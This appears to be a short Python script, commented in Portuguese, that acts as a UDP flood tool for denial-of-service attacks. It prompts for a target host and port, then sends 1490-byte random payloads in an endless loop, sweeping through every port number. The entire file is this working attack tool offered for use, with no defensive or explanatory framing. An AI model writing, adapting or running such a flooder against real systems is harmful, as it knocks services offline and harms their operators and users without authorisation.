#Importações
import socket
import random

#criar as variáveis importantes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payloads = random._urandom(1490)

#Variáveis para informar o endereço do alvo
host = input('Informe o host alvo: ')
port = int(input('Informe a porta: '))
sent = 0

while True:
    sock.sendto(payloads, (host, port))
    sent = sent + 1
    port = port + 1
    print('Enviando {} pacotes para {} atravéis da porta {}'.format(sent, host, port))
    
    if port == 65536:
        port = 0
    sock.close